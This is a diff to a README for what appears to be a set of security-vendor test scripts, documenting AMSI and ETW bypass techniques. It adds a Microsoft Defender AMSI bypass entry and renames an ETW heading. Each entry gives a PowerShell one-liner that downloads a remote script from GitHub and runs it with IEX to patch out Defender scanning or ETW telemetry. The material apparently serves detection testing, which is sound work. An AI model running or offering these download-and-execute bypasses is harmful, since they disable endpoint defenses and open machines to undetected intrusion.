@@ -50,10 +50,16 @@ A more evasive variant that also identifies AmsiScanBuffer function through a me
 
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI2.ps1"); Invoke-bypass2;`
 
+### 2. Microsoft Defender AmsiBypass
+Instead of patching Amsi, its better to patch the amsi scan from within the defender, this way also breaking the tampering validation
+
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-DefAmsi.ps1"); Invoke-DefByp455;`
+
 ## ETW Bypass
 Security Detection tools collect ETW telemtry for detection purposes, disabling the collection through ETW event function patching will tamper most security solutions (recommend to execute post AMSI bypass)
 
-### 1. EtwEventW
+### 1. EtwEventWrite
+
 `PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ETW1.ps1"); Invoke-E7wByp455;`
 
 
